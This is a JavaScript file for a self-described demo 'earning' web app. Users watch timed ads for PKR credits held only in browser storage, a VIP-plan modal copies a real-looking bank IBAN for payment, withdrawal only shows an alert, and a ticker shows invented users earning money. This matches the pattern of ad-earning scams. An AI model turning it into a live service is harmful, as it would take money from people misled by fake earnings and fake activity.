/* ===================================
   EVA EARNING DEMO
   script.js - Part 1
=================================== */

// Splash Screen

window.addEventListener("load", () => {

setTimeout(() => {

document.getElementById("splash").style.display = "none";

document.getElementById("app").classList.remove("hidden");

}, 5000);

});

// Local Storage Data

let wallet = Number(localStorage.getItem("wallet")) || 0;
let todayReward = Number(localStorage.getItem("todayReward")) || 0;
let adsLeft = Number(localStorage.getItem("adsLeft")) || 5;
let adsWatched = Number(localStorage.getItem("adsWatched")) || 0;

let currentPlan = localStorage.getItem("plan") || "FREE";

let login = localStorage.getItem("login") || "false";

let userName = localStorage.getItem("userName") || "Guest";

let userEmail = localStorage.getItem("userEmail") || "demo@example.com";

// Elements

const walletEl = document.getElementById("wallet");
const rewardEl = document.getElementById("todayReward");
const adsEl = document.getElementById("adsLeft");

const profileName = document.getElementById("profileName");
const profileEmail = document.getElementById("profileEmail");
const profilePlan = document.getElementById("profilePlan");
const profileBalance = document.getElementById("profileBalance");
const adsWatchEl = document.getElementById("adsWatched");
const totalRewardEl = document.getElementById("totalRewards");

const planName = document.getElementById("planName");

// Refresh UI

function refreshUI(){

walletEl.innerHTML = "PKR " + wallet;

rewardEl.innerHTML = "PKR " + todayReward;

adsEl.innerHTML = adsLeft;

planName.innerHTML = currentPlan;

profileName.innerHTML = userName;

profileEmail.innerHTML = userEmail;

profilePlan.innerHTML = currentPlan;

profileBalance.innerHTML = "PKR " + wallet;

adsWatchEl.innerHTML = adsWatched;

totalRewardEl.innerHTML = "PKR " + wallet;

}

refreshUI();


// Theme

const themeBtn = document.getElementById("themeBtn");

if(localStorage.getItem("theme")=="light"){

document.body.classList.add("light");

themeBtn.innerHTML="☀️";

}

themeBtn.onclick=function(){

document.body.classList.toggle("light");

if(document.body.classList.contains("light")){

localStorage.setItem("theme","light");

themeBtn.innerHTML="☀️";

}else{

localStorage.setItem("theme","dark");

themeBtn.innerHTML="🌙";

}

};


// Login

const loginBtn=document.getElementById("loginBtn");

loginBtn.onclick=function(){

document.getElementById("loginModal").style.display="flex";

};

document.getElementById("closeLogin").onclick=function(){

document.getElementById("loginModal").style.display="none";

};

document.getElementById("loginSubmit").onclick=function(){

let name=document.getElementById("username").value.trim();

let email=document.getElementById("email").value.trim();

if(name==""){

alert("Please enter your name.");

return;

}

userName=name;

userEmail=email;

login="true";

localStorage.setItem("login","true");

localStorage.setItem("userName",name);

localStorage.setItem("userEmail",email);

refreshUI();

document.getElementById("loginModal").style.display="none";

alert("Welcome " + name);

};/* ==========================
   WATCH AD + NAVIGATION
========================== */

const watchBtn = document.getElementById("watchAd");
const timer = document.getElementById("timer");

watchBtn.onclick = function(){

if(login!="true"){

alert("Please Login First");
return;

}

if(adsLeft<=0){

alert("Today's demo ads finished.");
return;

}

watchBtn.disabled=true;

let sec=15;

timer.innerHTML="Ad Ends In : "+sec+"s";

let run=setInterval(function(){

sec--;

timer.innerHTML="Ad Ends In : "+sec+"s";

if(sec<=0){

clearInterval(run);

adsLeft--;

adsWatched++;

wallet+=100;

todayReward+=100;

localStorage.setItem("wallet",wallet);
localStorage.setItem("todayReward",todayReward);
localStorage.setItem("adsLeft",adsLeft);
localStorage.setItem("adsWatched",adsWatched);

refreshUI();

timer.innerHTML="🎉 PKR 100 Added";

setTimeout(()=>{

timer.innerHTML="";
watchBtn.disabled=false;

},2500);

}

},1000);

};


/* ==========================
   BOTTOM NAVIGATION
========================== */

const pages=document.querySelectorAll(".page");

const navBtns=document.querySelectorAll(".navBtn");

navBtns.forEach(btn=>{

btn.onclick=function(){

navBtns.forEach(x=>x.classList.remove("active"));

this.classList.add("active");

pages.forEach(p=>p.classList.remove("active"));

document
.getElementById(this.dataset.page)
.classList.add("active");

};

});


/* ==========================
   VIP PLAN
========================== */

document.querySelectorAll(".buyPlan").forEach(btn=>{

btn.onclick=function(){

document.getElementById("paymentModal").style.display="flex";

};

});


document.getElementById("closePayment").onclick=function(){

document.getElementById("paymentModal").style.display="none";

};


/* ==========================
   COPY IBAN
========================== */

document.getElementById("copyIban").onclick=function(){

navigator.clipboard.writeText(
"PK88TMFB0000000037817113"
);

alert("IBAN Copied");

};


/* ==========================
   WITHDRAW
========================== */

document.getElementById("withdrawBtn").onclick=function(){

if(login!="true"){

alert("Please Login First");

return;

}

alert("Demo Withdrawal Submitted Successfully.");

};/* ==========================
   DEMO ACTIVITY TICKER
========================== */

const tickerText = document.getElementById("tickerText");

const demoMessages = [

"Ahmad completed a reward task",

"Fatima earned demo points",

"Ali finished today's demo ad",

"Hina received a demo reward",

"Usman completed a task",

"Bilal earned PKR 100",

"Ayesha watched a demo ad",

"Hamza completed today's reward"

];

setInterval(()=>{

tickerText.innerHTML="🟢 Demo Activity : "+demoMessages[Math.floor(Math.random()*demoMessages.length)];

},3000);


/* ==========================
   24 HOUR RESET
========================== */

const ONE_DAY = 24*60*60*1000;

let lastReset = Number(localStorage.getItem("lastReset")) || Date.now();

if(Date.now()-lastReset>=ONE_DAY){

adsLeft=5;

todayReward=0;

localStorage.setItem("adsLeft",5);

localStorage.setItem("todayReward",0);

localStorage.setItem("lastReset",Date.now());

refreshUI();

}


/* ==========================
   LOGOUT
========================== */

document.getElementById("logoutBtn").onclick=function(){

if(confirm("Logout?")){

localStorage.removeItem("login");

localStorage.removeItem("userName");

localStorage.removeItem("userEmail");

location.reload();

}

};


/* ==========================
   CLOSE POPUPS
========================== */

window.onclick=function(e){

const loginModal=document.getElementById("loginModal");

const paymentModal=document.getElementById("paymentModal");

if(e.target===loginModal){

loginModal.style.display="none";

}

if(e.target===paymentModal){

paymentModal.style.display="none";

}

};


/* ==========================
   SAVE DATA
========================== */

function saveData(){

localStorage.setItem("wallet",wallet);

localStorage.setItem("todayReward",todayReward);

localStorage.setItem("adsLeft",adsLeft);

localStorage.setItem("adsWatched",adsWatched);

localStorage.setItem("plan",currentPlan);

}

window.addEventListener("beforeunload",saveData);


/* ==========================
   START
========================== */

refreshUI();

console.log("Eva Earning Demo Loaded Successfully");
